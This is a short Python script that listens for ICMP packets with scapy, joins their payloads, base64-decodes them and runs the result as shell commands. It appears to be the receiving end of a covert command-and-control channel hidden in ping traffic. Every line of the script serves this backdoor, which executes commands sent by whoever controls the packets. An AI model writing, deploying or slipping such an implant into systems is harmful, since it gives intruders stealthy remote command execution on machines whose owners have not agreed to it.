#!/usr/bin/env python

from scapy.all import *
from base64 import b64decode
import subprocess
data = []
cmd = ''.join(data)


def sniffer(packet):
	global data
	if packet.haslayer(IP):
		fragment = str(packet[Raw])
		data.append(str(packet[Raw]))
		print "[+] Received fragment %s" % fragment			
	try:
		cmd = ''.join(data)
		decoded = b64decode(cmd)
		exec_cmd(decoded)
		data = []
	except:
		pass
def exec_cmd(cmd):
	print " "
	print "[+] Received command %s" % cmd		
	print "[+] Executing command %s" % cmd
	proc = subprocess.Popen(str(cmd), stdout=subprocess.PIPE, shell=True)
	(out, err) = proc.communicate()
	print " "
	print out
	if err:
		print err

def main():
	print "Listening for packets with encoded data..."
	sniff(filter="ip proto \icmp", iface="eth1", prn=sniffer)

if __name__ == '__main__':
	main()
